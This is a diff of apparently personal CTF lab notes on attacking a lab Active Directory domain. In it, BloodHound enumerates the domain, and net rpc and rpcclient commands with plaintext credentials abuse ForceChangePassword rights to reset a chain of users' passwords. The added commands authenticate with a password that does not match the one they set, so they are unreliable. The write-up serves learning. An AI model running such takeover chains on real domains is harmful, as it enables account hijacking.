@@ -6,6 +6,8 @@ Since you have credentials, we can run `bloodhound` to get the Active Directory 
 
  `bloodhound-python -d thm.corp -u 'AUTOMATE' -p 'Passw0rd1' -ns MACHINE IP -c All`
 
+![[Screenshot from 2024-08-19 19-27-32.png]]
+
 You'll get 7 `json` files :
 
 ![[Screenshot from 2024-08-12 19-35-27.png]]
@@ -40,12 +42,6 @@ More info about [[Neo4j]].\
 	![[Screenshot from 2024-08-13 20-17-31.png]]
 - Once all the files have been imported click on Refresh.![[Screenshot from 2024-08-13 20-11-17.png]]
 
-## Analyzing the BloodHound data
-
-- In the `Analysis` section, you can find `Pre-Built Analytics Queries`.
-- Run the `Find AS-REP Roastable Users (DontReqPreAuth)` Query.
-	![[Screenshot from 2024-08-13 20-21-19.png]]
-	There are 3 users that do not have `Kerberos pre-authentication` enabled.
 
 ### Transitive Object Control
 
@@ -69,13 +65,11 @@ Transitive Object Control are objects this user can gain control of by performin
 ### Changing  and resetting passwords
 In bloodhound, if you right click on one of the arrows that contains the `rights` you have on other users, you get a help section that contains techniques you could use to take advantage of those rights :
 
-#### Changing `SHAWNA_BRAY's` password using `TABATHA_BRITT's` credentials
+#### Changing SHAWNA_BRAY's password using TABATHA_BRITT's credentials
 
-`xfreerdp /u:TABATHA_BRITT /p:'marlboro(1985)' /v:<MACHINE IP\> /dynamic-resolution`
 
-Open a command cmd.exe an run the following to change the TABATHA_BRITT's password:
+`net rpc password 'SHAWNA_BRAY' 'Password@4444' -U thm.corp/'TABATHA_BRITT'%'marlboro(1985)' -S \<MACHINE IP>`
 
-`net user SHAWNA_BRAY Password@4444 /domain`
 
 Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
 
@@ -84,25 +78,16 @@ Confirm that the changes were successful  choosing Execution rights->First degre
 
 The **ForceChangePassword** permission allows us (in this case SHAWNA_BRAY\@THM.CORP) to reset a user's password without knowing their current password. So this user can reset CRUZZ_HALL\@THM.CORP's password.
 
-`rpcclient -U thm.corp/SHAWNA_BRAY%'Password@4444' <MACHINE IP>`
-
-rpcclient $> `setuserinfo2 CRUZ_HALL 23 Password@4444`                           rpcclient $> `exit`   
+`net rpc password 'CRUZ_HALL' 'Password@4444' -U thm.corp/'SHAWNA_BRAY'%'newPassword@4444' -S \<MACHINE IP>`  
 
 Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
 
 ![[Screenshot from 2024-08-15 20-43-32.png]]
 
-#### CRUZZ_HALL\@THM.CORP\ -> ForceChangePassword -> DARLA_WINTERS\@THM.CORP
+#### CRUZ_HALL\@THM.CORP\ -> ForceChangePassword -> DARLA_WINTERS\@THM.CORP
 
 Same as above, this time CRUZZ_HALL\@THM.CORP can reset DARLA_WINTERS\@THM.CORP's password.
 
-`rpcclient -U thm.corp/CRUZZ_HALL%'Password@4444' <MACHINE IP>`
-
-rpcclient $> `setuserinfo2 DARLA_WINTERS 23 Password@4444`                       rpcclient $> `exit`  
-
-Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
-
-![[Screenshot from 2024-08-18 12-49-59.png]]
+`net rpc password 'DARLA_WINTERS' 'Password@4444' -U thm.corp/'CRUZ_HALL'%'newPassword@4444' -S \<MACHINE IP>`  
 
 **Next step:** [[Delegation]]
-
